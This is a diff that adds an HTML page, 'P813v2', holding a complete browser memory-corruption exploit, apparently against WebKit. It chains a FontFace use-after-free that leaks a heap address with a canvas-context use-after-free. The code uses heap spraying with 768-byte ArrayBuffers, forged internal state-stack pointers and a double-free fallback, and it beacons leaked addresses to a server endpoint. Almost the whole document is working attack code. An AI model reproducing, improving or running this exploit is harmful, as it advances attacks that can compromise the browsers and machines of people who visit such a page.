@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P813v2</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+</style>
+</head><body>
+<pre id="o">P813v2 — silent AB(768) reclaim + forged stateStack</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s){O.textContent+='\n'+s;}
+
+/* Beacon ONLY after all reads are done — sync XHR competes for the freed slot! */
+var pendingBeacons=[];
+function bn(t,d){pendingBeacons.push(t+'|'+String(d||'').slice(0,900));}
+function flushBeacons(){
+  for(var i=0;i<pendingBeacons.length;i++){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/beacon.php?tag=P813v2-'+encodeURIComponent(pendingBeacons[i].split('|')[0])+'&data='+encodeURIComponent(pendingBeacons[i].slice(pendingBeacons[i].indexOf('|')+1))+'&t='+Date.now(),false);
+      x.send();
+    }catch(e){}
+  }
+  pendingBeacons=[];
+}
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_bu=new BigUint64Array(_b8);
+function f2h(v){_f64[0]=v;return '0x'+('0000000000000000'+_bu[0].toString(16)).slice(-16);}
+
+/* ========== PHASE 1: FontFace UAF for heap address ========== */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  /* Find reclaimed FontFace AB */
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+
+  if(bestI<0||bestNz<4){
+    /* FontFace miss — reload silently */
+    setTimeout(function(){location.reload();},200);
+    return;
+  }
+
+  /* Compute H (self_addr of FontFace AB) */
+  var bv=new DataView(fabs[bestI]);
+  var q11lo=bv.getUint32(0x58,true);
+  var q11hi=bv.getUint32(0x5C,true);
+  if(q11hi===0){
+    setTimeout(function(){location.reload();},200);
+    return;
+  }
+  var borrow=(q11lo<0x68)?1:0;
+  var H_hi=q11hi-borrow;
+  var H_lo=(q11lo-0x68)>>>0;
+
+  /* Write known markers into FontFace AB at State field offsets */
+  var fabDV=new DataView(fabs[bestI]);
+  fabDV.setFloat64(48, 1234.5678, true);  /* lineWidth position */
+  fabDV.setFloat64(64, 9876.5432, true);  /* miterLimit position (testing both +56 and +64) */
+  fabDV.setFloat64(56, 5678.1234, true);  /* alternative miterLimit offset */
+  fabDV.setFloat64(0, 0.5, true);         /* globalAlpha position */
+
+  /* ========== PHASE 2: Canvas UAF — ZERO BEACONS FROM HERE ========== */
+  /*
+   * CRITICAL: No sync XHR between UAF trigger and first read!
+   * XHR internal buffers compete for the 768B free slot.
+   */
+
+  var innerCtx=null;
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+
+  var opts={};
+  Object.defineProperty(opts,'alpha',{
+    get:function(){
+      innerCtx=canvas.getContext('2d');
+      return true;
+    }
+  });
+  canvas.getContext('bitmaprenderer',opts);
+
+  if(!innerCtx){
+    bn('FAIL','no_innerCtx');
+    flushBeacons();
+    setTimeout(function(){location.reload();},200);
+    return;
+  }
+
+  /* NO beacon here! */
+
+  /* Flush bmalloc dealloc log — use SAME size class (768) not 16! */
+  var flushAbs=[];
+  for(var f=0;f<50;f++){
+    var fa=new ArrayBuffer(768);
+    flushAbs.push(fa);
+  }
+
+  /* AB(768) spray — bigger count for reliability */
+  var SPRAY=400;
+  var abs=[];
+  var dvs=[];
+  for(var s=0;s<SPRAY;s++){
+    var ab=new ArrayBuffer(768);
+    abs.push(ab);
+    dvs.push(new DataView(ab));
+  }
+
+  /* Forge m_stateStack in ALL spray ABs */
+  for(var w=0;w<dvs.length;w++){
+    var dv=dvs[w];
+    /* m_stateStack.m_buffer = H (FontFace AB address) */
+    dv.setUint32(112, H_lo, true);
+    dv.setUint32(116, H_hi, true);
+    /* m_stateStack.m_capacity = 1 */
+    dv.setUint32(120, 1, true);
+    /* m_stateStack.m_size = 1 */
+    dv.setUint32(124, 1, true);
+  }
+
+  /* ========== PHASE 3: THE READ (may crash if reclaim failed) ========== */
+  var results={};
+  var readOK=false;
+
+  try{
+    var lw=innerCtx.lineWidth;
+    readOK=true;
+    results.lw=lw;
+    results.lwHex=f2h(lw);
+  }catch(e){
+    results.lwErr=e.message;
+  }
+
+  if(readOK){
+    try{results.ml=innerCtx.miterLimit;results.mlHex=f2h(results.ml);}catch(e){results.mlErr=e.message;}
+    try{results.ga=innerCtx.globalAlpha;results.gaHex=f2h(results.ga);}catch(e){results.gaErr=e.message;}
+    try{
+      var t=innerCtx.getTransform();
+      results.transform=[f2h(t.a),f2h(t.b),f2h(t.c),f2h(t.d),f2h(t.e),f2h(t.f)];
+    }catch(e){results.transformErr=e.message;}
+    try{results.fs=innerCtx.fillStyle;}catch(e){results.fsErr=e.message;}
+    try{results.ss=innerCtx.strokeStyle;}catch(e){results.ssErr=e.message;}
+  }
+
+  /* ========== PHASE 4: NOW we can beacon (reads are done) ========== */
+  var Hstr='0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8);
+  bn('ADDR','H='+Hstr+'|nz='+bestNz);
+
+  if(!readOK){
+    bn('READ-CRASH','lwErr='+results.lwErr);
+    flushBeacons();
+    log('Read crashed — AB reclaim may have failed');
+    log('H='+Hstr);
+
+    /* Try approach B: same-type reclaim first, then check if lineWidth works */
+    log('Trying fallback: same-type reclaim...');
+    approachB(H_hi, H_lo, Hstr);
+    return;
+  }
+
+  /* Check markers */
+  var lwMatch=(results.lw===1234.5678);
+  var mlMatch1=(results.ml===9876.5432);
+  var mlMatch2=(results.ml===5678.1234);
+  bn('READ-OK','lw='+results.lw+'|hex='+results.lwHex+'|ml='+results.ml+'|ga='+results.ga);
+  bn('VERIFY','lwM='+(lwMatch?'Y':'N:'+results.lw)+'|mlM1='+(mlMatch1?'Y':'N')+'|mlM2='+(mlMatch2?'Y':'N:'+results.ml));
+
+  if(results.transform){
+    bn('TRANSFORM',results.transform.join('|'));
+  }
+  if(results.fs!==undefined) bn('FS',results.fs);
+  if(results.ss!==undefined) bn('SS',results.ss);
+
+  if(lwMatch){
+    bn('CONFIRMED','FORGED_STATESTACK_READ_WORKS');
+    log('*** FORGED STATESTACK CONFIRMED! ***');
+    log('lineWidth='+results.lw+' (MATCH)');
+    log('miterLimit='+results.ml+' ('+((mlMatch1||mlMatch2)?'MATCH':'miss')+')');
+    log('globalAlpha='+results.ga);
+    if(results.transform) log('transform: '+results.transform.join(', '));
+    if(results.fs) log('fillStyle: '+results.fs);
+    if(results.ss) log('strokeStyle: '+results.ss);
+  }else{
+    bn('MISMATCH','expected=1234.5678|got='+results.lw);
+    log('Marker mismatch — lw='+results.lw+' hex='+results.lwHex);
+    log('ml='+results.ml+' ga='+results.ga);
+    log('AB reclaim hit but wrong slot, or offset wrong');
+  }
+
+  /* Null stale ref */
+  innerCtx=null;
+
+  /* Clean up forge */
+  for(var c=0;c<dvs.length;c++){
+    dvs[c].setFloat64(112,0,true);
+    dvs[c].setUint32(120,0,true);
+    dvs[c].setUint32(124,0,true);
+  }
+
+  bn('DONE','complete');
+  flushBeacons();
+  log('H='+Hstr);
+  log('=== P813v2 COMPLETE ===');
+},600);
+
+/* ========== APPROACH B: Same-type reclaim + AB(768) second stage ========== */
+function approachB(H_hi, H_lo, Hstr){
+  /* Same-type reclaim the freed context first (proven to work in P794/P812) */
+  var innerB=null;
+  var canvasB=document.createElement('canvas');
+  canvasB.width=1;canvasB.height=1;
+  var optsB={};
+  Object.defineProperty(optsB,'alpha',{
+    get:function(){
+      innerB=canvasB.getContext('2d');
+      return true;
+    }
+  });
+  canvasB.getContext('bitmaprenderer',optsB);
+
+  if(!innerB){
+    bn('B-FAIL','no_ctx');
+    flushBeacons();
+    return;
+  }
+
+  /* Same-type spray */
+  var BSPRAY=400;
+  var bCtxs=[];
+  var bCanvases=[];
+  for(var i=0;i<BSPRAY;i++){
+    var c=document.createElement('canvas');
+    c.width=1;c.height=1;
+    var ctx=c.getContext('2d');
+    ctx.lineWidth=7777.77;
+    bCtxs.push(ctx);
+    bCanvases.push(c);
+  }
+
+  var bLW;
+  try{bLW=innerB.lineWidth;}catch(e){bLW=-1;}
+
+  if(bLW!==7777.77){
+    bn('B-MISS','lw='+bLW);
+    flushBeacons();
+    log('Fallback reclaim also missed (lw='+bLW+')');
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+
+  /* Find alias */
+  innerB.lineWidth=8888.88;
+  var aliasIdx=-1;
+  for(var i=0;i<BSPRAY;i++){
+    if(bCtxs[i].lineWidth===8888.88){aliasIdx=i;break;}
+  }
+
+  bn('B-ALIAS','idx='+aliasIdx);
+  log('Same-type reclaim OK, alias at '+aliasIdx);
+
+  /* Now we have a LIVE alias. Write a known value and confirm bidirectional */
+  var live=bCtxs[aliasIdx];
+  var stale=innerB;
+
+  live.lineWidth=3333.33;
+  var check=stale.lineWidth;
+  bn('B-BIDIR','set=3333.33|read='+check+'|ok='+(check===3333.33));
+
+  /* Phase B2: Now free the ALIAS context (second UAF) via bitmaprenderer on its canvas */
+  /* This gives us a dangling stale ptr + the freed slot can be reclaimed by AB(768) */
+  var innerB2=null;
+  var optsB2={};
+  Object.defineProperty(optsB2,'alpha',{
+    get:function(){
+      innerB2=bCanvases[aliasIdx].getContext('2d');
+      return true;
+    }
+  });
+  bCanvases[aliasIdx].getContext('bitmaprenderer',optsB2);
+
+  /* innerB2 would be a NEW 2d context on the same canvas — but bitmaprenderer replaced it */
+  /* The original alias context is now freed. stale (innerB) still points to it. */
+
+  /* AB(768) spray to reclaim the freshly freed context */
+  var abs2=[];
+  var dvs2=[];
+  for(var s=0;s<400;s++){
+    var ab=new ArrayBuffer(768);
+    abs2.push(ab);
+    dvs2.push(new DataView(ab));
+  }
+
+  /* Forge m_stateStack pointing to FontFace AB */
+  for(var w=0;w<dvs2.length;w++){
+    dvs2[w].setUint32(112, H_lo, true);
+    dvs2[w].setUint32(116, H_hi, true);
+    dvs2[w].setUint32(120, 1, true);
+    dvs2[w].setUint32(124, 1, true);
+  }
+
+  /* Read through the ORIGINAL stale pointer */
+  var b2OK=false;
+  var b2lw;
+  try{
+    b2lw=stale.lineWidth;
+    b2OK=true;
+  }catch(e){
+    bn('B2-CRASH','err='+e.message);
+  }
+
+  if(b2OK){
+    var b2lwMatch=(b2lw===1234.5678);
+    bn('B2-READ','lw='+b2lw+'|hex='+f2h(b2lw)+'|match='+b2lwMatch);
+    log('Approach B read: lw='+b2lw+' match='+b2lwMatch);
+
+    if(b2lwMatch){
+      bn('B2-CONFIRMED','FORGED_READ_VIA_DOUBLE_FREE');
+      log('*** APPROACH B CONFIRMED! ***');
+
+      try{
+        var b2ml=stale.miterLimit;
+        bn('B2-ML','val='+b2ml+'|hex='+f2h(b2ml));
+        log('miterLimit='+b2ml);
+      }catch(e){}
+      try{
+        var b2ga=stale.globalAlpha;
+        bn('B2-GA','val='+b2ga+'|hex='+f2h(b2ga));
+        log('globalAlpha='+b2ga);
+      }catch(e){}
+      try{
+        var b2t=stale.getTransform();
+        bn('B2-TRANSFORM',[f2h(b2t.a),f2h(b2t.b),f2h(b2t.c),f2h(b2t.d),f2h(b2t.e),f2h(b2t.f)].join('|'));
+        log('transform: a='+b2t.a+' b='+b2t.b);
+      }catch(e){}
+    }else{
+      bn('B2-MISMATCH','got='+b2lw);
+      log('Marker mismatch in approach B');
+    }
+  }
+
+  /* Clean up */
+  stale=null;innerB=null;
+  for(var c=0;c<dvs2.length;c++){
+    dvs2[c].setFloat64(112,0,true);
+    dvs2[c].setUint32(120,0,true);
+    dvs2[c].setUint32(124,0,true);
+  }
+
+  bn('B-DONE','complete');
+  flushBeacons();
+  log('=== P813v2 COMPLETE ===');
+}
+</script></body></html>
